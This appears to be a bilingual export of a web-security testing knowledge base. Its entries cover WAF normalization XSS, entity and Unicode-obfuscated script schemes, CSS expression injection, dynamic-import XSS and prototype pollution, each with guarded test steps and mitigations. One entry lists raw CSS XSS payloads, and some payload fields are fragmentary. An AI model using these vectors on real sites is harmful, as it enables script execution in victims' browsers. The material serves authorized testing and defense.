title.zh: 核验URL 编码重复参数污染证据
title.en: Verify evidence for URL-Encoded Duplicate Parameter Pollution

description.zh: 确认后端生成额外参数或选择与安全层不同的值，并导致状态或权限变化；同时排除编码字符留在普通值中、统一 400、代理仅规范化日志或无状态差异。
description.en: Confirm that the backend creates an extra parameter or selects a value different from the security layer and causes a state or privilege change; also exclude Encoded characters remaining in a normal value, uniform 400 responses, log-only proxy normalization, or no state difference.

review.rationale: 原集合是编码分隔符 HPP 载荷，应归入 API 安全。

prerequisites.zh: 确认 Cloudflare 规则集、应用输出上下文、浏览器版本和 CSP，在隔离页面使用自有模块/DOM canary。
prerequisites.en: Confirm Cloudflare ruleset, application output context, browser version, and CSP, using an owned module or DOM canary in an isolated page.

prerequisites.zh: 记录边缘接收/阻止、源站存储/反射和最终 DOM 解析，每次只保留一种事件、实体或 import 变体。
prerequisites.en: Record edge acceptance or blocking, origin storage or reflection, and final DOM parsing, retaining only one event, entity, or import variant per test.

analysis.zh: 阳性要求变体通过边缘后进入可执行浏览器上下文，并在真实浏览器触发唯一 DOM canary，堆栈可追踪到输入。Cloudflare 放行、响应含标签、DOM 节点存在、模块请求因 CSP/CORS 失败、浏览器解析报错、alert 文本回显或测试脚本自行设 canary 都是假阳性。
analysis.en: Positive evidence requires a variant to pass the edge, reach an executable browser context, and trigger the unique DOM canary in a real browser with a stack trace to input. Cloudflare acceptance, a tag in the response, a DOM node, module fetch blocked by CSP or CORS, browser parse errors, reflected alert text, or a harness-set canary is a false positive.

opsecTips.zh: DOM canary 首次执行后停止，不读取 Cookie、加载第三方脚本或外传页面数据。
opsecTips.en: Stop after the DOM canary first executes; do not read cookies, load third-party scripts, or exfiltrate page data.

opsecTips.zh: 删除页面/模块 fixture 和浏览器 profile，清理 CDN/应用缓存与 trace，并恢复输出编码、CSP 和 WAF 规则。
opsecTips.en: Delete page and module fixtures and browser profiles, clear CDN and application caches and traces, and restore output encoding, CSP, and WAF rules.

name.zh: Cloudflare 规范化差异 XSS 测试

description.zh: 使用事件处理器、动态导入和编码实体检查边缘过滤与浏览器最终 DOM 解析是否存在差异。
description.en: Uses event handlers, dynamic imports, and encoded entities to test differences between edge filtering and final browser DOM parsing.

subCategory.zh: 边缘 WAF 与浏览器解析差异
subCategory.en: Edge WAF and Browser Parsing Differential

overview.zh: 原集合是特定历史绕过片段，但是否有效取决于当前 Cloudflare 规则、应用输出上下文与浏览器策略。本条按浏览器解析与脚本执行边界审查；应把所有外部地址和敏感动作替换为自有无害标记，在真实浏览器记录最终 DOM、CSP 与调用栈。
overview.en: The original set contains historical bypass fragments whose relevance depends on current Cloudflare rules, application output context, and browser policy. This entry is reviewed as a browser parsing and script-execution boundary; Replace external destinations and sensitive actions with owned harmless markers and record final DOM, CSP, and stack traces in a real browser.

vulnerability.zh: 若边缘允许经浏览器规范化后进入可执行 DOM 上下文的输入，攻击者可在受害者源中执行脚本。确认标准是通过浏览器调用栈、DOM 属性和 CSP 报告确认脚本由目标页面执行；WAF 放行但输出被编码、下载为文本、CSP 阻止或扩展脚本触发不能作为漏洞证据。
vulnerability.en: If the edge permits input that browser normalization turns into an executable DOM context, an attacker may execute script in the victim origin. Confirmation requires Confirm from browser stack traces, DOM attributes, and CSP reports that the target page executed the script; WAF allowance followed by output encoding, text download, CSP blocking, or extension-triggered script is not vulnerability evidence.

exploitation.zh: 1. 在隔离浏览器记录普通文本标记的服务端存储、响应编码、CSP 和 DOM 落点；2. 逐项使用原始结构但将外部地址替换为自有空脚本端点，并保持输入上下文一致；3. 通过浏览器调用栈、DOM 属性和 CSP 报告确认脚本由目标页面执行。WAF 放行但输出被编码、下载为文本、CSP 阻止或扩展脚本触发应记录为误报。
exploitation.en: 1. Record storage, response encoding, CSP, and DOM sink for a plain-text marker in an isolated browser. 2. Use original structures one at a time while replacing external addresses with an owned empty-script endpoint and preserving the input context. 3. Confirm from browser stack traces, DOM attributes, and CSP reports that the target page executed the script. Treat WAF allowance followed by output encoding, text download, CSP blocking, or extension-triggered script as false positives.

mitigation.zh: 1. 对每个 HTML、属性、URL 和脚本上下文执行正确输出编码；2. 使用可靠 HTML 净化器并避免动态事件属性和脚本 URL；3. 部署严格 CSP 与 Trusted Types，并让源站验证独立于 WAF。
mitigation.en: 1. Apply correct output encoding for each HTML, attribute, URL, and script context. 2. Use a reliable HTML sanitizer and avoid dynamic event attributes and script URLs. 3. Deploy strict CSP and Trusted Types and keep origin validation independent of the WAF.

title.zh: 建立边缘 WAF 与浏览器解析差异基线
title.en: Establish the Edge WAF and Browser Parsing Differential baseline

description.zh: 在隔离浏览器记录普通文本标记的服务端存储、响应编码、CSP 和 DOM 落点，并保存原始请求、响应与服务端关联标识。
description.en: Record storage, response encoding, CSP, and DOM sink for a plain-text marker in an isolated browser, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行边缘 WAF 与浏览器解析差异变体
title.en: Execute the Edge WAF and Browser Parsing Differential variants

description.zh: 逐项使用原始结构但将外部地址替换为自有空脚本端点，并保持输入上下文一致，严格保持其他变量不变并设置停止阈值。
description.en: Use original structures one at a time while replacing external addresses with an owned empty-script endpoint and preserving the input context, holding all other variables constant and defining a stop threshold.

attackChain.payload: ">

title.zh: 核验Cloudflare 规范化差异 XSS 测试证据
title.en: Verify evidence for Cloudflare Normalization-Differential XSS Testing

description.zh: 通过浏览器调用栈、DOM 属性和 CSP 报告确认脚本由目标页面执行；同时排除WAF 放行但输出被编码、下载为文本、CSP 阻止或扩展脚本触发。
description.en: Confirm from browser stack traces, DOM attributes, and CSP reports that the target page executed the script; also exclude WAF allowance followed by output encoding, text download, CSP blocking, or extension-triggered script.

review.rationale: 原命令属于 XSS 解析差异测试，不应归入认证漏洞。

prerequisites.zh: 定位受控输入进入的真实 HTML 属性类型，固定浏览器、HTML parser、URL sanitizer、CSP 和交互要求。
prerequisites.en: Locate the exact HTML attribute type receiving controlled input and pin browser, HTML parser, URL sanitizer, CSP, and interaction requirement.

prerequisites.zh: 用只修改 DOM canary 的安全 scheme/表达式替代 alert，配对十进制、十六进制、补零实体和纯文本版本。
prerequisites.en: Replace alert with a safe scheme or expression that only modifies a DOM canary, pairing decimal, hexadecimal, zero-padded entity, and plaintext forms.

analysis.zh: 阳性是过滤层未识别实体编码，而浏览器在目标属性中解码为可执行语义并经必要交互设置 canary。实体被显示为文本、DOM 属性仍是安全 URL、javascript scheme 被浏览器/CSP 阻止、标签在非属性上下文、只发生 HTML 解码或无用户触发都不是 XSS。
analysis.en: Positive evidence is the filter missing entity encoding while the browser decodes executable semantics in the target attribute and sets the canary after any required interaction. Entities displayed as text, a safe DOM URL, browser or CSP blocking javascript, a tag outside an attribute context, HTML decoding alone, or absent user trigger is not XSS.

opsecTips.zh: 一次实体变体设置 DOM canary 后停止，不使用凭据读取、导航或网络 sink。
opsecTips.en: Stop after one entity variant sets the DOM canary; do not use credential reads, navigation, or network sinks.

opsecTips.zh: 删除注入内容和浏览器 profile，清除 DOM 快照/缓存，并恢复上下文编码、scheme 白名单和 CSP。
opsecTips.en: Delete injected content and browser profiles, clear DOM snapshots and caches, and restore contextual encoding, scheme allowlisting, and CSP.

name.zh: HTML 实体规范化 XSS

description.zh: 检查过滤器与浏览器对十进制、十六进制和补零 HTML 实体的解码是否不同并形成可执行 URL。
description.en: Tests whether filters and browsers decode decimal, hexadecimal, and zero-padded HTML entities differently and produce executable URLs.

overview.zh: 原始集合主要把 javascript 协议和控制字符编码进 href 等属性，必须在真实属性上下文中评估。本条按浏览器解析与脚本执行边界审查；应把所有外部地址和敏感动作替换为自有无害标记，在真实浏览器记录最终 DOM、CSP 与调用栈。
overview.en: The original set primarily encodes the javascript scheme and controls inside attributes and must be evaluated in a real attribute context. This entry is reviewed as a browser parsing and script-execution boundary; Replace external destinations and sensitive actions with owned harmless markers and record final DOM, CSP, and stack traces in a real browser.

vulnerability.zh: 若过滤器检查编码前文本而浏览器解码后识别脚本协议，攻击者可能绕过 URL scheme 限制执行脚本。确认标准是确认浏览器解码后的属性成为可执行协议并由页面事件实际触发；源码中保留实体但 DOM 属性安全、点击被 CSP 阻止或仅静态显示不能作为漏洞证据。
vulnerability.en: If a filter checks predecoded text while the browser recognizes a script scheme after decoding, an attacker may bypass URL-scheme restrictions and execute script. Confirmation requires Confirm that browser-decoded attributes become executable schemes and are actually triggered by a page event; Entities remaining in source while DOM attributes are safe, CSP-blocked clicks, or static display is not vulnerability evidence.

exploitation.zh: 1. 用普通 HTTPS 链接和纯文本实体记录净化器输出、DOM 属性值与 CSP 行为；2. 逐项提交原始实体编码结构，把执行动作替换为设置随机 DOM 标记；3. 确认浏览器解码后的属性成为可执行协议并由页面事件实际触发。源码中保留实体但 DOM 属性安全、点击被 CSP 阻止或仅静态显示应记录为误报。
exploitation.en: 1. Record sanitizer output, DOM attribute values, and CSP behavior for a normal HTTPS link and plain text entity. 2. Submit original entity-encoded structures one at a time while replacing execution with a random DOM marker. 3. Confirm that browser-decoded attributes become executable schemes and are actually triggered by a page event. Treat Entities remaining in source while DOM attributes are safe, CSP-blocked clicks, or static display as false positives.

mitigation.zh: 1. 在完成规范化后按 URL 上下文允许协议和来源；2. 使用成熟净化器并禁止事件属性与脚本协议；3. 结合 CSP 和 Trusted Types 验证浏览器最终 DOM。
mitigation.en: 1. Allowlist URL schemes and origins after canonicalization. 2. Use a mature sanitizer and prohibit event attributes and script schemes. 3. Use CSP and Trusted Types and test the browser's final DOM.

title.zh: 建立实体编码脚本 URL基线
title.en: Establish the Entity-Encoded Script URLs baseline

description.zh: 用普通 HTTPS 链接和纯文本实体记录净化器输出、DOM 属性值与 CSP 行为，并保存原始请求、响应与服务端关联标识。
description.en: Record sanitizer output, DOM attribute values, and CSP behavior for a normal HTTPS link and plain text entity, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行实体编码脚本 URL变体
title.en: Execute the Entity-Encoded Script URLs variants

description.zh: 逐项提交原始实体编码结构，把执行动作替换为设置随机 DOM 标记，严格保持其他变量不变并设置停止阈值。
description.en: Submit original entity-encoded structures one at a time while replacing execution with a random DOM marker, holding all other variables constant and defining a stop threshold.

title.zh: 核验HTML 实体规范化 XSS证据
title.en: Verify evidence for HTML Entity Normalization XSS

description.zh: 确认浏览器解码后的属性成为可执行协议并由页面事件实际触发；同时排除源码中保留实体但 DOM 属性安全、点击被 CSP 阻止或仅静态显示。
description.en: Confirm that browser-decoded attributes become executable schemes and are actually triggered by a page event; also exclude Entities remaining in source while DOM attributes are safe, CSP-blocked clicks, or static display.

review.rationale: 原内容是 HTML 实体编码 XSS 载荷，归入 XSS。

prerequisites.zh: 固定输入编码、代理解码、HTML 属性上下文和浏览器版本，逐层记录 Unicode code point 与最终 DOM 属性。
prerequisites.en: Pin input encoding, proxy decoding, HTML attribute context, and browser version, recording Unicode code points and final DOM attributes at every layer.

prerequisites.zh: 以无副作用 DOM canary 替代 alert，对控制字符、百分号编码、全宽字符及规范 ASCII 版本做配对。
prerequisites.en: Replace alert with a side-effect-free DOM canary and pair control characters, percent encoding, full-width characters, and canonical ASCII forms.

analysis.zh: 阳性要求过滤器看到的变体经后续规范化恢复为浏览器可执行 scheme/事件，并实际触发 canary，负责转换的层可定位。浏览器能显示 Unicode、属性字符串变化、URL 解码发生、script scheme 被阻止、解析失败或只在日志中看似 javascript 都是假阳性。
analysis.en: Positive evidence requires a filter-visible variant to normalize later into a browser-executable scheme or event and actually trigger the canary, with the responsible layer identified. Browser Unicode display, changed attribute strings, URL decoding, blocked script schemes, parse failure, or javascript appearance only in logs is a false positive.

opsecTips.zh: 定位一个规范化差异并触发 canary 后停止，不叠加实体、双编码或外部资源加载。
opsecTips.en: Stop after locating one normalization differential and triggering the canary; do not stack entities, double encoding, or external resource loads.

opsecTips.zh: 删除 Unicode fixture 与浏览器数据，清理各层原始捕获/缓存，并恢复统一字符集和规范化后校验。
opsecTips.en: Delete Unicode fixtures and browser data, clear raw captures and caches at every tier, and restore one character set and post-normalization validation.

name.zh: Unicode 与控制字符 XSS 规范化

description.zh: 使用制表符、换行和 Unicode 字符混入脚本协议，检查各层规范化后浏览器是否恢复可执行语义。
description.en: Mixes tabs, newlines, and Unicode characters into script schemes to test whether browser normalization restores executable semantics.

overview.zh: 原始集合聚焦 java 与 script 之间的控制字符以及字符宽度差异，结果依赖属性解析和浏览器版本。本条按浏览器解析与脚本执行边界审查；应把所有外部地址和敏感动作替换为自有无害标记，在真实浏览器记录最终 DOM、CSP 与调用栈。
overview.en: The original set focuses on control characters between java and script and character-width differences, with results depending on attribute parsing and browser version. This entry is reviewed as a browser parsing and script-execution boundary; Replace external destinations and sensitive actions with owned harmless markers and record final DOM, CSP, and stack traces in a real browser.

vulnerability.zh: 如果 WAF 和净化器未按浏览器规则统一规范化，危险协议可能在过滤阶段不可见而在 DOM 中重新组合。确认标准是通过 DOM 属性、事件触发和调用栈确认规范化后确实形成脚本执行；字符被保留为文本、URL 解析失败、浏览器拒绝协议或仅 WAF 日志命中不能作为漏洞证据。
vulnerability.en: If the WAF and sanitizer do not canonicalize according to browser rules, a dangerous scheme may be hidden during filtering and reconstructed in the DOM. Confirmation requires Use DOM attributes, event triggering, and stack traces to confirm that normalization produces script execution; Characters preserved as text, URL parse failure, browser scheme rejection, or WAF-log matches only is not vulnerability evidence.

exploitation.zh: 1. 在目标浏览器记录安全 URL、含控制字符的普通文本和净化后 DOM 属性；2. 逐项提交原始 Unicode/UTF-8 变体，并把脚本动作替换为无害页面标记；3. 通过 DOM 属性、事件触发和调用栈确认规范化后确实形成脚本执行。字符被保留为文本、URL 解析失败、浏览器拒绝协议或仅 WAF 日志命中应记录为误报。
exploitation.en: 1. Record a safe URL, ordinary text containing controls, and sanitized DOM attributes in the target browser. 2. Submit original Unicode and UTF-8 variants one at a time and replace script actions with harmless page markers. 3. Use DOM attributes, event triggering, and stack traces to confirm that normalization produces script execution. Treat Characters preserved as text, URL parse failure, browser scheme rejection, or WAF-log matches only as false positives.

mitigation.zh: 1. 统一到明确 Unicode 规范形态后再做校验；2. 使用上下文编码与协议允许列表而非黑名单；3. 在支持浏览器中测试控制字符、全角字符和多重解码。
mitigation.en: 1. Normalize to an explicit Unicode form before validation. 2. Use context encoding and scheme allowlists rather than blacklists. 3. Test controls, full-width characters, and multiple decoding across supported browsers.

title.zh: 建立脚本协议字符混淆基线
title.en: Establish the Script-Scheme Character Obfuscation baseline

description.zh: 在目标浏览器记录安全 URL、含控制字符的普通文本和净化后 DOM 属性，并保存原始请求、响应与服务端关联标识。
description.en: Record a safe URL, ordinary text containing controls, and sanitized DOM attributes in the target browser, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行脚本协议字符混淆变体
title.en: Execute the Script-Scheme Character Obfuscation variants

description.zh: 逐项提交原始 Unicode/UTF-8 变体，并把脚本动作替换为无害页面标记，严格保持其他变量不变并设置停止阈值。
description.en: Submit original Unicode and UTF-8 variants one at a time and replace script actions with harmless page markers, holding all other variables constant and defining a stop threshold.

attackChain.payload: click click click click click click click click click click click click

title.zh: 核验Unicode 与控制字符 XSS 规范化证据
title.en: Verify evidence for Unicode and Control-Character XSS Normalization

description.zh: 通过 DOM 属性、事件触发和调用栈确认规范化后确实形成脚本执行；同时排除字符被保留为文本、URL 解析失败、浏览器拒绝协议或仅 WAF 日志命中。
description.en: Use DOM attributes, event triggering, and stack traces to confirm that normalization produces script execution; also exclude Characters preserved as text, URL parse failure, browser scheme rejection, or WAF-log matches only.

review.rationale: 原命令是 Unicode/UTF-8 混淆 XSS，应归入 XSS。

prerequisites.zh: 确认用户输入进入 style 属性、样式表或 CSSOM 的具体 sink，并锁定支持的现代/遗留浏览器范围和 CSP。
prerequisites.en: Confirm the exact style-attribute, stylesheet, or CSSOM sink receiving user input, and pin supported modern or legacy browser scope and CSP.

prerequisites.zh: 使用只设置视觉/DOM canary 的安全 fixture，分别验证 URL、expression、behavior 和旧引擎特性，配对普通 CSS。
prerequisites.en: Use a safe fixture that only sets a visual or DOM canary, validating URL, expression, behavior, and legacy-engine features separately against ordinary CSS controls.

analysis.zh: 阳性要求目标支持浏览器把注入 CSS 构造解释为可执行路径并触发 canary，且应用确实允许该样式上下文。CSS 被保留、背景 URL 普通加载、现代浏览器忽略 legacy expression、CSP 拦截、语法错误、样式改变但无脚本执行或不受支持浏览器理论均是假阳性。
analysis.en: Positive evidence requires the target supported browser to interpret the injected CSS construct as an execution path and trigger the canary, with the application actually allowing that style context. Preserved CSS, ordinary background loads, modern browsers ignoring legacy expression, CSP blocking, syntax errors, visual changes without script, or unsupported-browser theory is a false positive.

opsecTips.zh: 一个受支持 CSS 构造首次触发 canary 后停止，不加载远程脚本、文件或命令协议。
opsecTips.en: Stop after one supported CSS construct first triggers the canary; do not load remote scripts, files, or command protocols.

opsecTips.zh: 删除样式 fixture 和浏览器 profile，清除缓存/trace，并恢复 CSS 属性白名单、URL 过滤和 CSP。
opsecTips.en: Delete style fixtures and browser profiles, clear caches and traces, and restore CSS-property allowlisting, URL filtering, and CSP.

name.zh: CSS URL 与 expression 注入

description.zh: 验证不可信样式是否允许 javascript URL、旧式 expression 或其他可执行 CSS 构造进入浏览器。
description.en: Tests whether untrusted style data permits javascript URLs, legacy expressions, or other executable CSS constructs to reach the browser.

overview.zh: 原集合包含现代浏览器通常阻止的脚本 URL 与旧 IE expression，必须按实际支持浏览器和 CSS 接收点区分。本条按浏览器解析与脚本执行边界审查；应把所有外部地址和敏感动作替换为自有无害标记，在真实浏览器记录最终 DOM、CSP 与调用栈。
overview.en: The original set includes script URLs often blocked by modern browsers and legacy IE expressions, requiring evaluation against actual supported browsers and CSS sinks. This entry is reviewed as a browser parsing and script-execution boundary; Replace external destinations and sensitive actions with owned harmless markers and record final DOM, CSP, and stack traces in a real browser.

vulnerability.zh: 当应用允许攻击者控制 style 属性或样式表且目标浏览器解释危险构造时，可能产生脚本执行或外部资源加载。确认标准是在受支持浏览器中确认 CSS 解析结果、资源请求或脚本调用来自目标页面；现代浏览器忽略 expression、CSS 规则无效或仅样式文本被回显不能作为漏洞证据。
vulnerability.en: When an attacker controls style attributes or stylesheets and the target browser interprets dangerous constructs, script execution or external resource loading may occur. Confirmation requires Confirm in a supported browser that CSS parsing, resource requests, or script calls originate from the target page; Modern browsers ignoring expression, invalid CSS rules, or reflected style text only is not vulnerability evidence.

exploitation.zh: 1. 确认输入进入 style 属性、style 元素或 CSS 文件的具体位置，并记录安全背景图基线；2. 逐项使用原始 CSS 结构，以自有无害资源和 DOM 标记替换外部脚本动作；3. 在受支持浏览器中确认 CSS 解析结果、资源请求或脚本调用来自目标页面。现代浏览器忽略 expression、CSS 规则无效或仅样式文本被回显应记录为误报。
exploitation.en: 1. Identify whether input enters a style attribute, style element, or CSS file and record a safe background-image baseline. 2. Use original CSS structures one at a time while replacing external script actions with owned harmless resources and DOM markers. 3. Confirm in a supported browser that CSS parsing, resource requests, or script calls originate from the target page. Treat Modern browsers ignoring expression, invalid CSS rules, or reflected style text only as false positives.

mitigation.zh: 1. 不允许用户提供任意 CSS，改用受限样式属性白名单；2. 对 URL 值执行结构化解析、协议与来源限制；3. 通过 CSP style-src 与 img-src 限制样式和资源来源。
mitigation.en: 1. Do not accept arbitrary CSS; allowlist narrowly scoped style properties. 2. Parse URL values structurally and restrict schemes and origins. 3. Constrain style and resource origins with CSP style-src and img-src.

title.zh: 建立样式上下文脚本执行基线
title.en: Establish the Style-Context Script Execution baseline

description.zh: 确认输入进入 style 属性、style 元素或 CSS 文件的具体位置，并记录安全背景图基线，并保存原始请求、响应与服务端关联标识。
description.en: Identify whether input enters a style attribute, style element, or CSS file and record a safe background-image baseline, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行样式上下文脚本执行变体
title.en: Execute the Style-Context Script Execution variants

description.zh: 逐项使用原始 CSS 结构，以自有无害资源和 DOM 标记替换外部脚本动作，严格保持其他变量不变并设置停止阈值。
description.en: Use original CSS structures one at a time while replacing external script actions with owned harmless resources and DOM markers, holding all other variables constant and defining a stop threshold.

attackChain.payload:
<div style="background:url('javascript:alert(1)')">
<div style="width:expression(alert(1))">
<div style="background-image:url('javascript:alert(1)')">
<div style="list-style-image:url('javascript:alert(1)')">
<div style="behavior:url('javascript:alert(1)')">
<div style="-moz-binding:url('javascript:alert(1)')">
<div style="width:expr/**/ession(alert(1))">
<div style="width:expr\ession(alert(1))">
<div style="width:exp/**/ression(alert(1))">
<div style="width:exp\ression(alert(1))">

title.zh: 核验CSS URL 与 expression 注入证据
title.en: Verify evidence for CSS URL and Expression Injection

description.zh: 在受支持浏览器中确认 CSS 解析结果、资源请求或脚本调用来自目标页面；同时排除现代浏览器忽略 expression、CSS 规则无效或仅样式文本被回显。
description.en: Confirm in a supported browser that CSS parsing, resource requests, or script calls originate from the target page; also exclude Modern browsers ignoring expression, invalid CSS rules, or reflected style text only.

review.rationale: 原集合属于 CSS 上下文 XSS，不是认证绕过。

prerequisites.zh: 控制测试模块域和无副作用模块，在隔离页面记录注入 JavaScript 上下文、CORS、CSP 与 module MIME。
prerequisites.en: Control a test module origin and side-effect-free module, recording injected JavaScript context, CORS, CSP, and module MIME in an isolated page.

prerequisites.zh: 分别测试事件处理器、普通 script 与 type=module 位置，并以不执行 import 的字符串和同源安全模块作对照。
prerequisites.en: Test event-handler, classic-script, and type=module positions separately, with a nonexecuted import string and safe same-origin module as controls.

analysis.zh: 阳性要求攻击者可控 input 构造实际执行 dynamic import，浏览器加载受控模块并由该模块设置唯一 canary，网络和堆栈可关联。模块 URL 出现在 DOM、请求被 CSP/CORS/MIME 阻止、import 解析报错、静态模块按设计加载、响应仅含代码文本或 canary 由页面脚本设置都不是 XSS。
analysis.en: Positive evidence requires attacker-controlled input to execute dynamic import, load the controlled module, and have that module set the unique canary, correlated through network and stack traces. A module URL in the DOM, fetch blocked by CSP, CORS, or MIME, import parse errors, intentional static module loading, code text only, or a page-set canary is not XSS.

opsecTips.zh: 无副作用模块首次设置 canary 后停止，不读取页面数据或加载第三方域模块。
opsecTips.en: Stop after the side-effect-free module first sets the canary; do not read page data or load modules from third-party domains.

opsecTips.zh: 删除模块/页面 fixture 和浏览器 profile，清理 module/CDN 缓存与 trace，并恢复 CSP、Trusted Types 和输出编码。
opsecTips.en: Delete module and page fixtures and browser profiles, clear module and CDN caches and traces, and restore CSP, Trusted Types, and output encoding.

name.zh: 动态 import 脚本加载 XSS

description.zh: 使用动态 import 语法检查事件处理器和脚本上下文是否允许从攻击者控制位置加载模块。
description.en: Uses dynamic import syntax to test whether event handlers and script contexts load modules from attacker-controlled locations.

overview.zh: 原集合在 img 事件与 script 元素中调用 import，风险依赖模块加载策略、CORS、CSP 和输入所在 JavaScript 上下文。本条按浏览器解析与脚本执行边界审查；应把所有外部地址和敏感动作替换为自有无害标记，在真实浏览器记录最终 DOM、CSP 与调用栈。
overview.en: The original set invokes import from image events and script elements, with risk depending on module policy, CORS, CSP, and the JavaScript context of the input. This entry is reviewed as a browser parsing and script-execution boundary; Replace external destinations and sensitive actions with owned harmless markers and record final DOM, CSP, and stack traces in a real browser.

vulnerability.zh: 若攻击者输入可进入可执行事件或脚本上下文并绕过来源限制，浏览器可能加载并执行远程模块。确认标准是确认目标页面发起模块请求并执行自有模块中的随机无害标记；仅发生预加载、CORS 或 CSP 阻止执行、语法被当作文本不能作为漏洞证据。
vulnerability.en: If attacker input reaches an executable event or script context and bypasses source restrictions, the browser may load and execute a remote module. Confirmation requires Confirm that the target page requests the module and executes a random harmless marker from the owned module; Preload-only requests, execution blocked by CORS or CSP, or syntax treated as text is not vulnerability evidence.

exploitation.zh: 1. 使用合法本地模块记录模块加载请求、CSP 决策和脚本调用栈；2. 逐项提交原始动态 import 结构，把远程地址替换为自有返回空模块的 HTTPS 端点；3. 确认目标页面发起模块请求并执行自有模块中的随机无害标记。仅发生预加载、CORS 或 CSP 阻止执行、语法被当作文本应记录为误报。
exploitation.en: 1. Use a legitimate local module to record module requests, CSP decisions, and script call stacks. 2. Submit original dynamic-import structures one at a time and replace remote addresses with an owned HTTPS endpoint serving an empty module. 3. Confirm that the target page requests the module and executes a random harmless marker from the owned module. Treat Preload-only requests, execution blocked by CORS or CSP, or syntax treated as text as false positives.

mitigation.zh: 1. 阻止不可信输入进入事件处理器和 JavaScript 代码上下文；2. 使用严格 CSP script-src 与 Trusted Types 限制动态脚本；3. 对模块 URL 使用固定映射而不是拼接用户输入。
mitigation.en: 1. Prevent untrusted input from entering event handlers and JavaScript code contexts. 2. Use strict CSP script-src and Trusted Types to constrain dynamic script. 3. Map module URLs from fixed identifiers rather than concatenating user input.

title.zh: 建立模块脚本接收点基线
title.en: Establish the Module-Script Sinks baseline

description.zh: 使用合法本地模块记录模块加载请求、CSP 决策和脚本调用栈，并保存原始请求、响应与服务端关联标识。
description.en: Use a legitimate local module to record module requests, CSP decisions, and script call stacks, retaining raw requests, responses, and server correlation identifiers.

title.zh: 执行模块脚本接收点变体
title.en: Execute the Module-Script Sinks variants

description.zh: 逐项提交原始动态 import 结构，把远程地址替换为自有返回空模块的 HTTPS 端点，严格保持其他变量不变并设置停止阈值。
description.en: Submit original dynamic-import structures one at a time and replace remote addresses with an owned HTTPS endpoint serving an empty module, holding all other variables constant and defining a stop threshold.

title.zh: 核验动态 import 脚本加载 XSS证据
title.en: Verify evidence for Dynamic import Script-Loading XSS

description.zh: 确认目标页面发起模块请求并执行自有模块中的随机无害标记；同时排除仅发生预加载、CORS 或 CSP 阻止执行、语法被当作文本。
description.en: Confirm that the target page requests the module and executes a random harmless marker from the owned module; also exclude Preload-only requests, execution blocked by CORS or CSP, or syntax treated as text.

review.rationale: 原命令是动态模块加载型 XSS 载荷，应归入 XSS。

prerequisites.zh: 在隔离页面固定第三方库版本和实际读取 Object.prototype 的 gadget，记录 own/inherited 属性与消费堆栈。
prerequisites.en: Pin third-party library version and the actual gadget reading Object.prototype in an isolated page, recording own and inherited properties and the consumer stack.

prerequisites.zh: 使用随机无权限 sentinel URL/值替代 evil.com，准备无污染、对象自有属性和删除原型后的对照。
prerequisites.en: Replace evil.com with a random nonprivileged sentinel URL or value, with unpolluted, own-property, and prototype-deletion controls.

analysis.zh: 阳性要求共享原型上的 sentinel 被真实 gadget 继承并改变后续资源或无副作用执行路径，堆栈证明未进行 own-property 校验。直接脚本给 Object.prototype 赋值、属性在 console 可见、库未读取、资源 URL 被 CSP 阻止、只改变当前对象或 BOOMR 字样出现均不证明可利用链。
analysis.en: Positive evidence requires a sentinel on the shared prototype to be inherited by a real gadget and alter a later resource or side-effect-free execution path, with the stack proving no own-property check. Direct assignment to Object.prototype, console visibility, an unread property, a CSP-blocked resource URL, current-object-only change, or BOOMR text does not prove an exploitable chain.

opsecTips.zh: sentinel 首次到达受控 gadget 后停止，不加载远程脚本或使用权限/命令属性。
opsecTips.en: Stop after the sentinel first reaches the controlled gadget; do not load remote scripts or use privilege or command properties.

opsecTips.zh: 删除污染属性，重载页面并销毁浏览器 profile，清除资源缓存/trace，恢复 own-property 校验和安全对象创建。
opsecTips.en: Delete polluted properties, reload the page and destroy the browser profile, clear resource caches and traces, and restore own-property checks and safe object creation.

name.zh: Object.prototype 污染触发链

description.zh: 验证共享 Object.prototype 属性是否能覆盖第三方脚本配置并改变后续资源 URL 或执行路径。
description.en: Tests whether shared Object.prototype properties override third-party script configuration and alter later resource URLs or execution paths.

subCategory.zh: 客户端原型污染到脚本加载
subCategory.en: Client-Side Prototype Pollution to Script Loading

overview.zh: 原始片段直接写入 BOOMR 与 url 等原型属性，属于客户端原型污染触发样例而非通用 WAF 片段。本条按对象原型与下游 gadget 边界审查；应使用无权限含义的随机哨兵，在隔离页面记录自有属性、继承属性和实际消费者调用栈。
overview.en: The original snippets write BOOMR and url properties directly onto the prototype and are client-side prototype-pollution trigger examples rather than generic WAF fragments. This entry is reviewed as a object-prototype and downstream-gadget boundary; Use a random nonprivileged sentinel and record own properties, inherited properties, and actual consumer stack traces in an isolated page.

vulnerability.zh: 如果应用或第三方库从普通对象读取未自有化的配置属性，污染值可能控制脚本 URL 或安全选项。确认标准是确认后续库通过继承读取污染值，并由该值触发资源请求或分支变化；仅原型值存在但无人读取、测试脚本自身发起请求或页面刷新清除污染不能作为漏洞证据。
vulnerability.en: If application or third-party code reads inherited configuration properties from ordinary objects, polluted values may control script URLs or security options. Confirmation requires Confirm that later library code reads the inherited polluted value and that it triggers a resource request or branch change; Prototype values existing without consumers, requests made by the test script itself, or pollution cleared on page refresh is not vulnerability evidence.

exploitation.zh: 1. 在干净页面记录相关配置对象的自有属性、原型链和正常资源请求；2. 逐项执行原始属性结构但将 URL 指向自有空资源，并在隔离浏览器刷新独立页面；3. 确认后续库通过继承读取污染值，并由该值触发资源请求或分支变化。仅原型值存在但无人读取、测试脚本自身发起请求或页面刷新清除污染应记录为误报。
exploitation.en: 1. Record own properties, prototype chain, and normal resource requests for relevant configuration objects on a clean page. 2. Execute original property structures one at a time with URLs pointing to owned empty resources and refresh an isolated page. 3. Confirm that later library code reads the inherited polluted value and that it triggers a resource request or branch change. Treat Prototype values existing without consumers, requests made by the test script itself, or pollution cleared on page refresh as false positives.

mitigation.zh: 1. 避免把不可信键写入 Object.prototype 或递归合并到普通对象；2. 对配置读取使用自有属性检查、无原型对象或 Map；3. 使用 CSP、依赖升级和原型污染回归测试限制触发链。
mitigation.en: 1. Avoid writing untrusted keys to Object.prototype or recursively merging into ordinary objects. 2. Use own-property checks, null-prototype objects, or Maps for configuration. 3. Use CSP, dependency upgrades, and prototype-pollution regression tests to constrain gadget chains.

title.zh: 建立客户端原型污染到脚本加载基线
title.en: Establish the Client-Side Prototype Pollution to Script Loading baseline

